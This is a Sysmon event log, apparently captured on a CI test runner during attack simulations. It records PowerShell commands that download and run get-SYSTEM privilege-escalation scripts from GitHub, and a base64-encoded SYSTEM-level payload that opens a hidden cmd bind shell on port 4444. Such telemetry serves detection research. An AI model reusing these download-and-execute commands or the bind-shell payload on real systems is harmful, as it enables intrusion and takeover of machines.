"12/17/2025 7:56:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:23.570
ProcessGuid: {f995aebf-6227-6942-0d04-000000000e00}
ProcessId: 7768
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -w 2 -noni -noP -sta -enc JABlAGEAcwB5AGIAaQBuAGQAIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0ADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBUAGgAcgBlAGEAZABpAG4AZwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBJAE8AOwAKAG4AYQBtAGUAcwBwAGEAYwBlACAAQgBhAGMAawBkAG8AbwByAFMAZQByAHYAZQByAAoAewAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABCAGEAYwBrAGQAbwBvAHIACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgAgAGwAaQBzAHQAZQBuAGUAcgA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABTAG8AYwBrAGUAdAAgAG0AYQBpAG4AUwBvAGMAawBlAHQAOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAaQBuAHQAIABwAG8AcgB0ADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGkAbgBnACAAbgBhAG0AZQA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABiAG8AbwBsACAAdgBlAHIAYgBvAHMAZQA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABQAHIAbwBjAGUAcwBzACAAcwBoAGUAbABsADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAZgByAG8AbQBTAGgAZQBsAGwAOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAIAB0AG8AUwBoAGUAbABsADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAaQBuAFMAdAByAGUAYQBtADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACAAbwB1AHQAUwB0AHIAZQBhAG0AOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAVABoAHIAZQBhAGQAIABzAGgAZQBsAGwAVABoAHIAZQBhAGQAOwAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAF8AYgBpAG4AZAAoAHMAdAByAGkAbgBnACAAaQBwACwAIABJAG4AdAAzADIAIABwAG8AcgB0ACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEIAYQBjAGsAZABvAG8AcgAgAGIAZAAgAD0AIABuAGUAdwAgAEIAYQBjAGsAZABvAG8AcgAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAZAAuAHMAdABhAHIAdABTAGUAcgB2AGUAcgAoAGkAcAAsAHAAbwByAHQAKQA7AAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB2AG8AaQBkACAAcwB0AGEAcgB0AFMAZQByAHYAZQByACgAcwB0AHIAaQBuAGcAIABuAHMALABpAG4AdAAgAHAAbwByAHQAYQAsACAAYgBvAG8AbAAgAHYAZQByAGIAPQBmAGEAbABzAGUAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABuAGEAbQBlACAAPQAgAG4AcwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG8AcgB0ACAAPQAgAHAAbwByAHQAYQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGUAcgBiAG8AcwBlACAAPQAgAHYAZQByAGIAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBQAEEAZABkAHIAZQBzAHMAIABpAHAAIAA9ACAASQBQAEEAZABkAHIAZQBzAHMALgBQAGEAcgBzAGUAKABuAHMAKQA7AAoACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAB2AGUAcgBiAG8AcwBlACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBMAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAHAAbwByAHQAIAAiACAAKwAgAHAAbwByAHQAKQA7AAoAbABpAHMAdABlAG4AZQByACAAPQAgAG4AZQB3ACAAVABjAHAATABpAHMAdABlAG4AZQByACgAaQBwACwAIABwAG8AcgB0ACkAOwAKAGwAaQBzAHQAZQBuAGUAcgAuAFMAdABhAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBhAGkAbgBTAG8AYwBrAGUAdAAgAD0AIABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABTAG8AYwBrAGUAdAAoACkAOwAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAHYAZQByAGIAbwBzAGUAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAEMAbABpAGUAbgB0ACAAYwBvAG4AbgBlAGMAdABlAGQAOgAgACIAIAArACAAbQBhAGkAbgBTAG8AYwBrAGUAdAAuAFIAZQBtAG8AdABlAEUAbgBkAFAAbwBpAG4AdAApADsACgBTAHQAcgBlAGEAbQAgAHMAIAA9ACAAbgBlAHcAIABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtACgAbQBhAGkAbgBTAG8AYwBrAGUAdAApADsACgBpAG4AUwB0AHIAZQBhAG0AIAA9ACAAbgBlAHcAIABTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAHMAKQA7AAoAbwB1AHQAUwB0AHIAZQBhAG0AIAA9ACAAbgBlAHcAIABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoAHMAKQA7AAoAbwB1AHQAUwB0AHIAZQBhAG0ALgBBAHUAdABvAEYAbAB1AHMAaAAgAD0AIAB0AHIAdQBlADsAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwAIAA9ACAAbgBlAHcAIABQAHIAbwBjAGUAcwBzACgAKQA7AAoAcwBoAGUAbABsAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIAA9ACAAUAByAG8AYwBlAHMAcwBXAGkAbgBkAG8AdwBTAHQAeQBsAGUALgBIAGkAZABkAGUAbgA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAHIAbwBjAGUAcwBzAFMAdABhAHIAdABJAG4AZgBvACAAcAAgAD0AIABuAGUAdwAgAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AKAAiAGMAbQBkACIAKQA7AAoAcAAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAD0AIABQAHIAbwBjAGUAcwBzAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAuAEgAaQBkAGQAZQBuADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAIAA9ACAAdAByAHUAZQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAIAA9ACAAZgBhAGwAcwBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAB0AHIAdQBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBoAGUAbABsAC4AUwB0AGEAcgB0AEkAbgBmAG8AIAA9ACAAcAA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBTAHQAYQByAHQAKAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAbwBTAGgAZQBsAGwAIAA9ACAAcwBoAGUAbABsAC4AUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABmAHIAbwBtAFMAaABlAGwAbAAgAD0AIABzAGgAZQBsAGwALgBTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABvAFMAaABlAGwAbAAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBoAGUAbABsAFQAaAByAGUAYQBkACAAPQAgAG4AZQB3ACAAVABoAHIAZQBhAGQAKABuAGUAdwAgAFQAaAByAGUAYQBkAFMAdABhAHIAdAAoAGcAZQB0AFMAaABlAGwAbABJAG4AcAB1AHQAKQApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbABUAGgAcgBlAGEAZAAuAFMAdABhAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUwB5AHMAdABlAG0AIABTAGgAZQBsAGwAIABzAHQAYQByAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkALgAiACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUwB0AGEAcgB0AGkAbgBnACAAcwBoAGUAbABsAC4ALgAuAFwAbgAiACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZwBlAHQASQBuAHAAdQB0ACgAKQA7AAoAZAByAG8AcABDAG8AbgBuAGUAYwB0AGkAbwBuACgAKQA7AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApACAAewAgAGQAcgBvAHAAQwBvAG4AbgBlAGMAdABpAG8AbgAoACkAOwAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAB2AG8AaQBkACAAZwBlAHQAUwBoAGUAbABsAEkAbgBwAHUAdAAoACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAcgBpAG4AZwAgAHQAZQBtAHAAQgB1AGYAIAA9ACAAIgAiADsACgAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAXAByAFwAbgAiACkAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAdABlAG0AcABCAHUAZgAgAD0AIABmAHIAbwBtAFMAaABlAGwAbAAuAFIAZQBhAGQATABpAG4AZQAoACkAKQAgACEAPQAgAG4AdQBsAGwAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoAHQAZQBtAHAAQgB1AGYAIAArACAAIgBcAHIAIgApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAgACAAIAAgAH0ACgAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsAfQAKAH0ACgBwAHIAaQB2AGEAdABlACAAdgBvAGkAZAAgAGcAZQB0AEkAbgBwAHUAdAAoACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAcgBpAG4AZwAgAHQAZQBtAHAAQgB1AGYAZgAgAD0AIAAiACIAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAKAB0AGUAbQBwAEIAdQBmAGYAIAA9ACAAaQBuAFMAdAByAGUAYQBtAC4AUgBlAGEAZABMAGkAbgBlACgAKQApACAAIQA9ACAAbgB1AGwAbAApACkACgAgACAAIAAgACAAIAAgACAAewAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAB2AGUAcgBiAG8AcwBlACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAbwBuAHMAbwBsAGUALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUgBlAGMAZQBpAHYAZQBkACAAYwBvAG0AbQBhAG4AZAA6ACAAIgAgACsAIAB0AGUAbQBwAEIAdQBmAGYAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaABhAG4AZABsAGUAQwBvAG0AbQBhAG4AZAAoAHQAZQBtAHAAQgB1AGYAZgApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApACAAewAgAH0ACgB9AAoACgBwAHIAaQB2AGEAdABlACAAdgBvAGkAZAAgAGgAYQBuAGQAbABlAEMAbwBtAG0AYQBuAGQAKABTAHQAcgBpAG4AZwAgAGMAbwBtACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoAGMAbwBtAC4ARQBxAHUAYQBsAHMAKAAiAGUAeABpAHQAIgApACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AdQB0AFMAdAByAGUAYQBtAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAFwAbgBcAG4AQwBsAG8AcwBpAG4AZwAgAHQAaABlACAAcwBoAGUAbABsACAAYQBuAGQAIABEAHIAbwBwAHAAaQBuAGcAIAB0AGgAZQAgAGMAbwBuAG4AZQBjAHQAaQBvAG4ALgAuAC4AIgApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAB0AG8AUwBoAGUAbABsAC4AVwByAGkAdABlAEwAaQBuAGUAKABjAG8AbQAgACsAIAAiAFwAcgBcAG4AIgApADsACgAgACAAIAAgAH0ACgAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsAIAB9AAoAfQAKAHAAcgBpAHYAYQB0AGUAIAB2AG8AaQBkACAAZAByAG8AcABDAG8AbgBuAGUAYwB0AGkAbwBuACgAKQAKAHsACgAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAdgBlAHIAYgBvAHMAZQApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBEAHIAbwBwAHAAaQBuAGcAIABDAG8AbgBuAGUAYwB0AGkAbwBuACIAKQA7AAoAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbAAuAEMAbABvAHMAZQAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbABUAGgAcgBlAGEAZAAuAEEAYgBvAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwAVABoAHIAZQBhAGQAIAA9ACAAbgB1AGwAbAA7AAoAIAAgACAAIAAgACAAIAAgAGkAbgBTAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsACgAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAHQAbwBTAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AUwBoAGUAbABsAC4ARABpAHMAcABvAHMAZQAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAG0AYQBpAG4AUwBvAGMAawBlAHQALgBDAGwAbwBzAGUAKAApADsACgAgACAAIAAgACAAIAAgACAAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgA7AAoAIAAgACAAIAB9AAoAIAAgACAAIABjAGEAdABjAGgAIAAoAEUAeABjAGUAcAB0AGkAbwBuACkAIAB7ACAAfQAKAH0AIAAgACAAIAAKACAAIAAgACAAfQAKAH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgACQAZQBhAHMAeQBiAGkAbgBkAAoAWwBCAGEAYwBrAGQAbwBvAHIAUwBlAHIAdgBlAHIALgBCAGEAYwBrAGQAbwBvAHIAXQA6ADoAXwBiAGkAbgBkACgAIgAxADIANwAuADAALgAwAC4AMQAiACwAIgA0ADQANAA0ACIAKQAKAA==
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-59d8-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 2
IntegrityLevel: System
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-59d7-6942-0d00-000000000e00}
ParentProcessId: 1000
ParentImage: C:\Windows\System32\lsass.exe
ParentCommandLine: C:\Windows\system32\lsass.exe
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:23.560
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\fi1ma43x\fi1ma43x.dll
Hashes: SHA256=FD0FF40C34E8356ACE57235B57B4F3BC617CB0B15FD6BADD465416643A862ADF
IsExecutable: true
Archived: true"
"12/17/2025 7:56:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:23.545
ProcessGuid: {f995aebf-6227-6942-0b04-000000000e00}
ProcessId: 6700
User: runnervm8j6r3\runneradmin
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\fi1ma43x\fi1ma43x.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:56:23 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:23.484
ProcessGuid: {f995aebf-6227-6942-0b04-000000000e00}
ProcessId: 6700
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=8AA62B9BE054D79B6575BEF1DCEDCB2A707741E0245EC876AF4FA0DAB71594FF
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:23 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:56:23.383
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:23 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:23.154
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rflxwrln.ynb.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:23.044
ProcessGuid: {f995aebf-6227-6942-0904-000000000e00}
ProcessId: 3252
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:22.890
ProcessGuid: {f995aebf-6226-6942-0704-000000000e00}
ProcessId: 6324
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_pxaswmvz.ecd.psm1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:22.890
ProcessGuid: {f995aebf-6226-6942-0704-000000000e00}
ProcessId: 6324
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_pk4tml52.jfk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:22.699
ProcessGuid: {f995aebf-6226-6942-0104-000000000e00}
ProcessId: 2096
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\t5fgnsk4\t5fgnsk4.dll
Hashes: SHA256=2DF1A757E3877C9C81224259F0D611ED43F9872209C068419C83981DEFC2C203
IsExecutable: true
Archived: true"
"12/17/2025 7:56:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:22.687
ProcessGuid: {f995aebf-6226-6942-0504-000000000e00}
ProcessId: 9316
User: runnervm8j6r3\runneradmin
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\t5fgnsk4\t5fgnsk4.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:56:22 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:22.626
ProcessGuid: {f995aebf-6226-6942-0504-000000000e00}
ProcessId: 9316
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=8AA62B9BE054D79B6575BEF1DCEDCB2A707741E0245EC876AF4FA0DAB71594FF
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:22 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:56:22.525
ProcessGuid: {f995aebf-6226-6942-0104-000000000e00}
ProcessId: 2096
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:22 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:22.228
ProcessGuid: {f995aebf-6226-6942-0104-000000000e00}
ProcessId: 2096
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rsrvtudy.n5o.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:22.057
ProcessGuid: {f995aebf-6226-6942-0104-000000000e00}
ProcessId: 2096
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
